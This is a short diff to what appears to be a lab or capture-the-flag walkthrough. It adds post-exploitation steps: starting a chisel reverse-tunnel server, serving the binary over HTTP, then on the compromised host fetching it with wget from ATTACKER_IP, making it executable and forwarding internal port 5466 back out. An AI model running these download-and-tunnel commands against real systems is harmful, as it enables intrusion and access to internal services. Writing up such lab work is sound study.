@@ -683,6 +683,19 @@ we know that it is working in port 5466:
 after reverse shell:
 
 start in your system ./chisel server -p 8000 --reverse
+2026/02/16 21:42:16 server: Reverse tunnelling enabled
+2026/02/16 21:42:16 server: Fingerprint /9goy3q1VvXolZIoLAhEoyCttr8wTcacWojMFO9H5/s=
+2026/02/16 21:42:16 server: Listening on http://0.0.0.0:8000
 
+also:
+python3 -m http.server 9001
+
+cd /tmp
+wget http://ATTACKER_IP:9001/chisel
+chmod +x chisel
+
+./chisel client ATTACKER_IP:8000 R:5466:127.0.0.1:5466
+Connected
 
 ```
+
